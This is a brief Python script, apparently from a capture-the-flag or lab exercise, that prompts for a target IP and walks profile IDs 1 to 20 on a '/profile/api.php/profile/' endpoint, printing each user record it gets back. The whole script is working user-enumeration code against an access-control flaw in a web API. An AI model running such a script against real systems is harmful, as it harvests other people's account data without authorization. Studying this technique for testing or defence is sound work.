#!/usr/bin/env python3
import requests
import json

def enum_users(url):
    for i in range(1, 21):
        target_url = f"{url}{i}"
        try:
            response = requests.get(target_url)
            if response.status_code == 200 and response.text:
                data = response.json()
                print(json.dumps(data, indent=4, ensure_ascii=False))
            else:
                exit(0)
        except Exception as e:
            print(f"Error as {e}")

if __name__ == "__main__":
    ip = input("IP: ")
    url = "http://" + ip + "/profile/api.php/profile/"
    enum_users(url)